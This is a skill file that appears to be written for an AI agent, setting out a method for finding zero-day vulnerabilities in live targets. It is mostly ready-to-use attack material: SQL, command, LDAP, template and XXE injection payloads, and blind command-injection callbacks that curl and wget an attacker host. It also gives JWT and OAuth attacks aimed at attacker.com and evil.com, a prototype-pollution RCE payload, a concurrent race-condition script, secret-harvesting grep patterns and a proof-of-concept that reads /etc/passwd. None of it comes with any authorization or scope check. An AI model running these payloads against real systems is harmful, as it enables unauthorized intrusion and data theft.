---
description: "Novel vulnerability discovery from scratch: attack surface mapping, input class analysis, all vuln class hunting, source code analysis, fuzzing, chain construction, PoC development. Use when all known CVEs are exhausted or target runs custom code."
---

# SKILL — zeroday

## Purpose
Systematic methodology for discovering novel, undisclosed vulnerabilities in live targets from scratch. This skill operates when all known CVE research is exhausted, the target is patched against public exploits, or the target runs custom code. It covers the complete process of finding a zero-day: attack surface analysis, code auditing, fuzzing, logic flaw discovery, chain construction, and PoC development — all from first principles.

## Core principle
A zero-day is not a special category of bug. It is a known vulnerability class applied to code that has never been audited for it. Every application that:
- parses input
- manages state
- crosses trust boundaries
- makes assumptions about caller behavior
...has bugs waiting to be found. The skill is in knowing where to look and what to look for.

## When to load
- All known CVEs checked — none apply or all patched
- Target runs custom or proprietary code
- Standard scanner output is clean but the target is clearly complex
- Asked to "find something new", "find a 0day", "look for novel bugs"
- All public exploits have been tried and failed
- Deep audit of a specific component is requested

---

## Phase 1 — Attack surface mapping (before touching code)

Before looking at any code or sending any payload, map every entry point precisely.

### Entry point categories
```
HTTP parameters:
  GET params:          ?id=1&user=foo&action=view
  POST body (form):    username=foo&password=bar&csrf=token
  POST body (JSON):    {"user":"foo","role":"admin","extra":{}}
  POST body (XML):     <request><user>foo</user></request>
  Path segments:       /api/v1/users/123/orders/456
  Headers:             Cookie, Authorization, X-Custom-Header, Host, Referer
  File uploads:        filename, content-type, file content, chunked transfer

WebSocket:
  Message structure
  Authentication mechanism (JWT in message? header? handshake?)
  Binary vs text frames

GraphQL:
  All queries
  All mutations
  All subscriptions
  Introspection schema

OAuth / SAML / OIDC flows:
  state parameter
  redirect_uri
  code exchange
  token validation

Import / export features:
  CSV import
  Excel import
  JSON import
  XML import
  ZIP upload

Third-party integrations:
  Webhook receivers
  API callbacks
  Payment notifications (Stripe, Razorpay, PayPal IPN)
  Email receiving (inbound parse webhooks)
```

### Entry point inventory
For each entry point record:
```
ID:           EP-<N>
Method:       GET / POST / WebSocket / etc.
URL:          <full URL>
Parameters:   <list of all params and their types>
Auth:         none / session cookie / JWT / API key / basic
Observed type: string / int / boolean / JSON / XML / file / binary
Server-side action: inferred from response behavior
Interesting?: yes/no — why
```

---

## Phase 2 — Input class analysis

For each interesting entry point, analyze the input systematically.

### The 10 questions for every input
```
1. What TYPE does the app expect? (string / int / email / URL / JSON / XML / binary)
2. What happens with WRONG TYPE? (int field gets string — error? silent cast? crash?)
3. What is the MAX LENGTH? What happens at length+1? At 10x? At MAX_INT?
4. What SPECIAL CHARACTERS are interpreted? (; | & ` $ \ / . * ? [ ])
5. Is the value REFLECTED anywhere? (in response, email, PDF, log)
6. Is the value STORED and displayed later? (XSS, stored injection)
7. Is the value passed to a SYSTEM CALL? (shell, DB, file op, template engine)
8. Is the value used in a COMPARISON? (auth check, permission check — type juggling?)
9. Can the value be EMPTY or NULL? What happens?
10. Is the value DESERIALIZED anywhere? (base64 decode -> unserialize)
```

### Type confusion opportunities
```php
# PHP loose comparison (==) vulnerabilities
"0" == false     -> true
"0e123" == "0"   -> true  (scientific notation, hash collisions)
0 == "a"         -> true  (old PHP < 8)
[] == false      -> true
null == ""       -> true
null == false    -> true

# Use case: login with hash collision
# If strcmp() used:
strcmp([], "password") -> 0 (null — treated as false — auth bypass)

# JavaScript type coercion
"5" + 3 = "53"
"5" - 3 = 2
[] == false
{} + [] = 0
```

---

## Phase 3 — Vulnerability class hunting

Work through every class systematically. Do not skip classes because they seem unlikely.

### 3.1 Injection — server-side

#### SQL injection — finding it manually
```
Step 1: Identify every database-touching parameter
  - Anything that returns different content for different values
  - Anything that looks up a record by ID, name, email, slug

Step 2: Test for error-based injection
  Inject: '  (single quote)
  Inject: ''  (two single quotes — should return to normal if injection point)
  Inject: `)  (close paren)
  Inject: \   (backslash — MySQL string escape)

Step 3: Test for boolean-based blind
  Original: ?id=5
  True:     ?id=5 AND 1=1 -- -    (identical response to original)
  False:    ?id=5 AND 1=2 -- -    (different response)

Step 4: Test for time-based blind (when no response difference)
  MySQL:    ?id=5 AND SLEEP(5) -- -
  MSSQL:    ?id=5; WAITFOR DELAY '0:0:5' -- -
  Oracle:   ?id=5 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5) -- -
  Postgres: ?id=5; SELECT pg_sleep(5) -- -

Step 5: Test second-order injection
  Register with username: admin'--
  Then use the app as that user — does anything break?
```

#### Command injection — finding it manually
```
Inject in order (most to least likely to work):
; id
| id
|| id
& id
&& id
`id`
$(id)
;id;
\nid

# Blind command injection (no output)
; sleep 5         (time delay confirms injection)
; ping -c 5 <LHOST>   (DNS/ICMP callback)
; curl http://<LHOST>/ci   (HTTP callback)
; wget http://<LHOST>/ci

# Context-specific
# In filenames:
test.jpg;id.jpg
test$(id).jpg
test`id`.jpg
# In email fields:
test+$(id)@test.com
# In Host header:
Host: target.com;id
```

#### LDAP injection
```
# Bypass authentication
*)(&
*)(uid=*))(|(uid=*
admin)(&(password=*
# Extract data
*()|%26'
*()|&'
```

#### XML injection / XXE discovery
```
# Does the app accept XML anywhere?
# Change Content-Type: application/json to Content-Type: application/xml
# Try uploading SVG, DOCX, XLSX, PDF, Office files

# If XML accepted, test for XXE:
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<test>&x;</test>
```

#### Server-side template injection — discovery
```
# Inject into every string field that gets rendered:
{{7*7}}
${7*7}
<%= 7*7 %>
#{7*7}
*{7*7}
{{7*'7'}}      (Jinja2 returns '7777777', Twig returns '49')
${"freemarker.template.utility.Execute"?new()("id")}

# Injection via HTTP headers (sometimes reflected in errors):
User-Agent: {{7*7}}
Referer: {{7*7}}
X-Forwarded-For: {{7*7}}
```

---

### 3.2 Broken access control — finding it manually

#### IDOR discovery
```
Step 1: Collect all object IDs in the application
  - Numeric IDs (/api/orders/1234)
  - UUIDs (/api/docs/550e8400-e29b-41d4-a716-446655440000)
  - Hashes (/files/a1b2c3d4e5f6)
  - Slugs (/users/johndoe)
  - Encoded values (/item/dXNlcl9pZD0x)  <- base64 decode this

Step 2: Create two accounts (A and B)
  Account A: create a resource (order, document, message)
  Record the ID/URL of that resource
  Account B: attempt to access that URL directly

Step 3: Test HTTP methods
  If GET /api/orders/1234 returns 403, try:
  POST /api/orders/1234
  PUT /api/orders/1234
  PATCH /api/orders/1234
  DELETE /api/orders/1234

Step 4: Test parameter pollution
  /api/orders?user_id=<attacker_id>&user_id=<victim_id>
  /api/orders?user_id=<victim_id>&user_id=<attacker_id>

Step 5: Test mass assignment
  POST /api/users/profile
  {"name":"test","email":"test@test.com","role":"admin"}
  # Does the app accept "role"?
  # Try adding: "is_admin":true, "admin":true, "privilege":"admin"
```

#### Privilege escalation via missing checks
```
# Map admin-only endpoints from source, JS, or documentation
# Access them while authenticated as regular user
# Common admin paths:
/api/admin/users
/api/admin/settings
/api/v1/internal/
/debug/
/actuator/env
/actuator/shutdown

# HTTP verb override
POST /admin/delete-user
X-HTTP-Method-Override: DELETE

# Path traversal in access control
/api/users/me/../admin/users
/api/v1/user/../admin
```

---

### 3.3 Business logic flaws — the hardest to find, highest value

These cannot be found by scanners. Require understanding the application's intended behavior.

#### Framework for finding logic bugs
```
For every multi-step workflow (checkout, registration, password reset, 2FA):
  1. Draw the intended flow (A -> B -> C -> D)
  2. Try skipping steps (A -> C -> D, bypassing B)
  3. Try going backwards (D -> B -> C)
  4. Try repeating steps (A -> B -> B -> C)
  5. Try parallelizing (send B twice simultaneously)
  6. Try invalid state transitions (what if B requires C to be done first?)
```

#### Race conditions
```
# Identify operations that check state then modify it:
- Balance check -> transfer
- Coupon validity check -> apply coupon
- Vote/like count -> increment
- Rate limit check -> allow request
- Token validity check -> consume token

# Test with parallel requests (Burp Turbo Intruder or curl):
# Send 50 identical requests simultaneously
python3 -c "
import threading, requests
url = 'https://target.com/api/coupon/apply'
cookies = {'session': 'YOUR_SESSION'}
data = {'code': 'SAVE10'}
results = []
def send():
    r = requests.post(url, json=data, cookies=cookies)
    results.append(r.status_code)
threads = [threading.Thread(target=send) for _ in range(50)]
[t.start() for t in threads]
[t.join() for t in threads]
print(results)
"

# Single-use coupon applied 50 times? Race condition confirmed.
```

#### Integer and numeric boundary issues
```
# Test numeric inputs with:
-1, 0, 1, 2^31-1 (2147483647), 2^31 (2147483648), 2^32-1, 2^63-1
0.1, -0.1, 0.001, 1e10, 1e-10
NaN, Infinity, -Infinity (JavaScript)

# Example: negative quantity in shopping cart
POST /api/cart/add
{"product_id":1,"quantity":-100}
# Does the total go negative? Does the app refund money?

# Example: integer overflow on vote count
# Send 2^31 vote requests — does counter wrap to negative?
```

#### Password reset logic
```
# Test every step of the reset flow:
1. Does the token expire? Test tokens from 1 hour, 24 hours, 1 week ago
2. Can the token be used multiple times?
3. Is the token predictable? (sequential, timestamp-based, short)
4. Is the token leaked in response headers, Referer header, or logs?
5. Does changing password invalidate the token?
6. Can you reset another user's password by manipulating user_id param?
7. What if you submit the reset form with victim's email but your token?
8. Is there a host header injection? (reset link uses Host header -> change to attacker domain)

# Host header injection in password reset:
POST /forgot-password HTTP/1.1
Host: attacker.com

# If reset email contains: "Click here: http://attacker.com/reset?token=..."
# Victim clicks -> token sent to attacker
```

---

### 3.4 Authentication flaws

#### JWT vulnerabilities — full checklist
```bash
# Decode JWT (base64url decode each part)
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d 2>/dev/null
# Or: jwt.io

# Test 1: Algorithm none
# Change header {"alg":"HS256"} to {"alg":"none"}
# Remove signature (keep trailing dot)
# Modified JWT: header.payload.

# Test 2: RS256 to HS256 confusion
# If server uses RS256, public key is often accessible
# Sign with the PUBLIC KEY using HS256 — server may verify with same key
# Get public key: /api/.well-known/jwks.json or /oauth/jwks

# Test 3: Weak secret brute force
hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt

# Test 4: kid (key ID) injection
# Change kid to: ../../../../dev/null
# Sign with empty string as secret
# Or: kid = SQL injection -> ' UNION SELECT 'hacker' -- -

# Test 5: x5u / jku injection
# Point to attacker-controlled JWKS endpoint
{"alg":"RS256","jku":"https://attacker.com/jwks.json"}

# Test 6: Expired token accepted
# Grab old token, replay it — does server check exp claim?
```

#### OAuth 2.0 vulnerabilities
```
# Test 1: Missing state parameter (CSRF on OAuth)
# If /oauth/authorize doesn't use state parameter:
# Craft link -> victim clicks -> attacker's account linked to victim

# Test 2: redirect_uri not validated
# Try: redirect_uri=https://evil.com
# Try: redirect_uri=https://target.com.evil.com
# Try: redirect_uri=https://target.com/../../evil
# Try: redirect_uri=https://target.com/callback?next=https://evil.com

# Test 3: Authorization code reuse
# Intercept auth code
# Use it twice — does server reject second use?

# Test 4: Access token in referrer
# After OAuth completion, navigate to external link
# Check Referer header — does it contain access_token?

# Test 5: scope escalation
# Request scope=read, get token
# Use token to access write endpoints — are scopes enforced?
```

---

### 3.5 Deserialization — finding it

```
# Where to look:
- Cookies containing base64 data (especially Java apps: rO0A = Java serialized)
- Hidden form fields with base64/binary data
- ViewState in ASP.NET apps (always test this)
- Redis session store values
- Message queue payloads
- API responses that get sent back as requests

# Detection:
- Java serialized data starts with: rO0A (base64) or 0xAC 0xED (binary)
- PHP serialized data: O:4:"User":1:{s:4:"name";s:5:"admin";}
- Python pickle: base64 decode -> contains b'\x80\x04'
- .NET BinaryFormatter: AAEAAAD (base64)

# ASP.NET ViewState testing:
# Decode ViewState (base64)
# If not encrypted -> tamper with deserialized object
# If __VIEWSTATEGENERATOR present -> need to match it
# Tools: ysoserial.net for .NET, YSoSerial for Java

# Java detection in headers:
# Set-Cookie: JSESSIONID=... (Java app)
# Set-Cookie: session=rO0A... (serialized Java object in cookie!)
```

---

### 3.6 SSRF — finding it

```
# Where to find SSRF:
- Any URL parameter: ?url=, ?redirect=, ?link=, ?src=, ?dest=, ?next=, ?target=, ?proxy=
- Webhook configuration: "callback_url", "webhook_url", "notify_url"
- PDF/screenshot generation services
- Image proxy services ("avatar_url", "profile_picture")
- Import features that fetch from URL
- XML requests (XXE -> SSRF)
- DNS lookback: any feature that sends email or pings a server

# Discovery methodology:
Step 1: Send a URL pointing to your server
  Value: http://<LHOST>/ssrf-probe
  Listen: nc -lvnp 80

Step 2: If direct IP blocked, try:
  http://169.254.169.254/ (cloud metadata)
  http://localhost/
  http://0.0.0.0/
  http://[::1]/

Step 3: Probe internal services
  http://127.0.0.1:22/
  http://127.0.0.1:3306/
  http://127.0.0.1:6379/     Redis
  http://127.0.0.1:27017/    MongoDB
  http://127.0.0.1:9200/     Elasticsearch
  http://127.0.0.1:2375/     Docker API
  http://127.0.0.1:10250/    Kubelet
  http://10.0.0.0/24         Internal subnet

Step 4: If response is blind (no response body), use DNS callback
  Value: http://<random>.<LHOST>/ (use interactsh)
  # If DNS query arrives, SSRF confirmed blind
```

---

### 3.7 Prototype pollution (JavaScript/Node.js)

```javascript
// Where to find it:
// - Any feature that deeply merges user-controlled JSON into an object
// - Libraries: lodash.merge, jQuery.extend, deepmerge (old versions)
// - Query parameter parsers that parse nested keys: ?__proto__[admin]=true

// Test payloads:
{"__proto__":{"admin":true}}
{"constructor":{"prototype":{"admin":true}}}
{"__proto__":{"isAdmin":true}}

// URL query string pollution:
?__proto__[admin]=1
?constructor[prototype][admin]=1

// Confirm pollution:
// After sending payload, check if {} (empty object) has .admin property
// In Node.js: {}.__proto__.admin === true

// Escalation to RCE (common in Node.js):
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=0.0.0.0:1337"}}
{"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').execSync('id > /tmp/pwned');var __tmp2"}}
```

---

### 3.8 Web cache poisoning

```
# Identify cache indicators in response:
X-Cache: HIT / MISS
Age: <seconds>
Vary: <headers>
CF-Cache-Status: HIT

# Find unkeyed inputs (headers not in cache key but reflected in response):
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: http
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Test:
1. Send request with X-Forwarded-Host: evil.com
2. Check if evil.com appears in response (e.g., in canonical URL, redirect URL, resource URL)
3. If yes, send without header -> check if poisoned response is cached
4. Next visitor receives poisoned response with evil.com in it

# DOM-based cache poisoning:
# Inject XSS payload via unkeyed header that gets reflected into JavaScript
X-Forwarded-Host: evil.com"></script><script>alert(1)</script>
```

---

## Phase 4 — Source code analysis (when available)

### Getting source code
```bash
# Check for exposed .git
curl -s https://target.com/.git/HEAD
# If 200 -> dump the repo
git clone https://target.com/ /tmp/target-git-dump 2>/dev/null || \
  python3 git-dumper.py https://target.com/ /tmp/target-git-dump

# Check for source map files
curl -s https://target.com/app.js.map  # contains original source
curl -s https://target.com/bundle.js.map

# Check for backup files
/index.php~ /index.php.bak /index.php.orig /index.php.save
/config.php.bak /.config.php.swp (vim swap)

# GitHub/GitLab search
https://github.com/search?q=<company>+<technology>&type=repositories
https://github.com/search?q="target.com"+password
```

### Automated static analysis
```bash
# PHP
grep -rn "eval\|exec\|system\|shell_exec\|passthru\|popen\|proc_open" --include="*.php" . 2>/dev/null
grep -rn "unserialize\|pickle" --include="*.php" . 2>/dev/null
grep -rn "\$_GET\|\$_POST\|\$_REQUEST\|\$_COOKIE" --include="*.php" . 2>/dev/null | grep -v "htmlspecialchars\|strip_tags\|filter_input"
grep -rn "mysqli_query\|->query\|execute" --include="*.php" . 2>/dev/null | grep "\$"

# Python
grep -rn "eval\|exec\|subprocess\|os\.system\|os\.popen" --include="*.py" . 2>/dev/null
grep -rn "pickle\.loads\|yaml\.load\|eval\|exec" --include="*.py" . 2>/dev/null
grep -rn "format\|%.*%.*%" --include="*.py" . 2>/dev/null | grep "query\|sql\|SELECT"

# JavaScript / Node.js
grep -rn "eval\|Function(\|child_process\|exec\|spawn" --include="*.js" . 2>/dev/null
grep -rn "__proto__\|constructor.prototype\|merge\|extend\|assign" --include="*.js" . 2>/dev/null
grep -rn "require('vm')\|require('child_process')" --include="*.js" . 2>/dev/null

# Secrets
grep -rE "(api[_-]?key|apikey|secret[_-]?key|access[_-]?token|auth[_-]?token|private[_-]?key)\s*[=:]\s*['\"][^'\"]{8,}['\"]" . 2>/dev/null
grep -rE "(password|passwd|pwd)\s*=\s*['\"][^'\"]{6,}['\"]" . 2>/dev/null
grep -rE "AKIA[0-9A-Z]{16}" . 2>/dev/null   # AWS key
grep -rE "ghp_[a-zA-Z0-9]{36}" . 2>/dev/null  # GitHub token

# Semgrep (automated)
semgrep --config=p/security-audit --config=p/owasp-top-ten . 2>/dev/null | tee recon/vulns/semgrep.txt
```

### Manual code review checklist
```
Authentication:
  [ ] Password hashing algorithm (bcrypt/argon2 = good, MD5/SHA1 = bad)
  [ ] Token generation (os.urandom/secrets = good, random.random = bad)
  [ ] Session invalidation on logout
  [ ] Password reset token entropy

Authorization:
  [ ] Every route has authorization check
  [ ] Check is at route level AND service level
  [ ] Object-level authorization (not just resource type, but specific resource)
  [ ] JWT signature verification (not just decode, actually verify)

Input handling:
  [ ] Parameterized queries everywhere
  [ ] Output encoding before rendering
  [ ] File upload validation (not just extension, but content)
  [ ] Redirect URL validation (whitelist, not blacklist)

Cryptography:
  [ ] No custom crypto
  [ ] IV/nonce reuse (ECB mode usage)
  [ ] Predictable random number generation
  [ ] Hardcoded keys or IVs
```

---

## Phase 5 — Fuzzing

### Web fuzzing strategy
```bash
# Fuzz every parameter for injection
for param in $(cat recon/http/parameters.txt); do
  ffuf -u "https://target.com/endpoint?${param}=FUZZ" \
    -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt \
    -mc all -fc 200 \
    -o recon/vulns/fuzz-${param}.json -of json
done

# JSON body fuzzing
ffuf -u "https://target.com/api/endpoint" \
  -X POST \
  -H "Content-Type: application/json" \
  -H "Cookie: session=VALID_SESSION" \
  -d '{"key":"FUZZ","other":"value"}' \
  -w /usr/share/wordlists/seclists/Fuzzing/special-chars.txt \
  -mc all -fc 200 \
  -o recon/vulns/fuzz-json.json -of json

# Path traversal fuzzing
ffuf -u "https://target.com/api/files/FUZZ" \
  -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -mc 200 \
  -o recon/vulns/fuzz-lfi.json -of json

# HTTP verb fuzzing
for method in GET POST PUT DELETE PATCH OPTIONS HEAD TRACE CONNECT; do
  code=$(curl -so /dev/null -w "%{http_code}" -X $method https://target.com/api/admin/)
  echo "$method -> $code"
done
```

### Anomaly detection during fuzzing
Watch for these response anomalies — each is a potential finding:
```
Response time spike      -> Blind injection (SQLi, command injection)
Response size increase   -> Information disclosure
Response size decrease   -> Filtering/WAF detected something
Different status code    -> Access control issue
Different content type   -> Parser confusion
Server error (500)       -> Unhandled exception, potential injection
Redirect to login        -> Auth check triggered (interesting endpoint)
Different headers        -> Different code path executed
```

---

## Phase 6 — Chain construction

### Chain catalog
Low-severity bugs become critical when chained. For the full 23-chain taxonomy and scoring matrix, load the `chain-detection` skill. Key patterns:

```
SSRF -> cloud metadata -> credentials -> S3/database access -> full data breach

Open redirect + OAuth -> account takeover
Self-XSS + CSRF -> stored XSS against any user
LFI + log poisoning -> RCE
LFI + phpinfo() -> RCE (race condition on tmp file)
LFI + /proc/self/environ -> RCE (via User-Agent)
SQLi read + weak credentials -> auth bypass -> admin RCE
XXE + SSRF -> internal service access
Path traversal in filename + file inclusion -> RCE
JWT weak secret + IDOR -> full account takeover
Prototype pollution + gadget chain -> RCE in Node.js
Cache poisoning + XSS -> stored XSS at scale
```

### Chain documentation format
```
CHAIN: <name>
Link 1: <finding> [EP-<N>] -> enables: <capability>
Link 2: <finding> [EP-<N>] -> enables: <capability>
Link 3: <finding> [EP-<N>] -> enables: <capability>
Final impact: <what can be achieved>
Preconditions: <what must be true>
Steps to test: <ordered steps>
Status: candidate / needs-validation / confirmed
```

---

## Phase 7 — PoC development

### PoC principles
```
1. Minimal — prove the bug with the smallest possible payload
2. Reproducible — works every time, not occasionally
3. Safe — does not cause damage beyond what is needed to prove the point
4. Documented — exact steps, exact request, exact response
5. Reversible — if a file is written, it is cleaned up in the same step
```

### PoC structure
```python
#!/usr/bin/env python3
"""
PoC: <vulnerability title>
Target: <URL/IP>
Type: <RCE/SQLi/SSRF/etc.>
CVE: N/A (zero-day)
Description:
  <what this proves and how>
"""

import requests

TARGET = "https://target.com"
SESSION = "valid_session_cookie"

def check_vulnerable():
    """Returns True if target is vulnerable."""
    # Minimal probe — time-based or boolean
    r = requests.get(f"{TARGET}/api/vuln",
                     params={"input": "' AND SLEEP(5)-- -"},
                     cookies={"session": SESSION},
                     timeout=10)
    return r.elapsed.total_seconds() >= 5

def exploit():
    """Demonstrate impact — read /etc/passwd."""
    payload = "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -"
    r = requests.get(f"{TARGET}/api/vuln",
                     params={"input": payload},
                     cookies={"session": SESSION})
    return r.text

if __name__ == "__main__":
    print("[*] Checking vulnerability...")
    if check_vulnerable():
        print("[+] VULNERABLE")
        print("[*] Extracting /etc/passwd...")
        result = exploit()
        print(result)
    else:
        print("[-] Not vulnerable or patched")
```

---

## Phase 8 — Evidence and reporting

### Zero-day finding document
```
ZERO-DAY FINDING
================
Title:          <descriptive title — no CVE yet>
Type:           <vulnerability class>
Location:       <exact endpoint, parameter>
Discovered:     <date>
Status:         confirmed

TRIGGER
-------
<exact input that causes the behavior>

REQUEST
-------
<full HTTP request>

RESPONSE
--------
<full HTTP response showing impact>

BASELINE
--------
<what the normal response looks like — showing the difference>

IMPACT
------
<what this enables — be specific about demonstrated impact>

ROOT CAUSE
----------
<why this exists — code-level explanation if source available>
<e.g.: "The `id` parameter is interpolated directly into the SQL query
        at line 47 of /app/routes/api.py without parameterization">

CHAIN
-----
<if part of a chain, list the full chain here>

REPRODUCTION
------------
1. <step>
2. <step>
3. <step>

REMEDIATION
-----------
<specific fix>

EVIDENCE PATH
-------------
vulns/confirmed/<title>.txt
loot/<relevant data>
```

---

## Rules
- Standard scanners do not find logic bugs — manual analysis is required
- Never conclude a target is secure — only conclude that testing is complete
- Every assumption in the code is a potential vulnerability
- A behavior different from baseline is worth 30 minutes of investigation
- Low severity + low severity + low severity can equal critical via chaining
- PoC must demonstrate actual impact — SSRF to 127.0.0.1 is not the same as SSRF to cloud metadata
- Document every negative result — it narrows the search space
- Prioritize chaining over individual findings — chains are what get full compromise
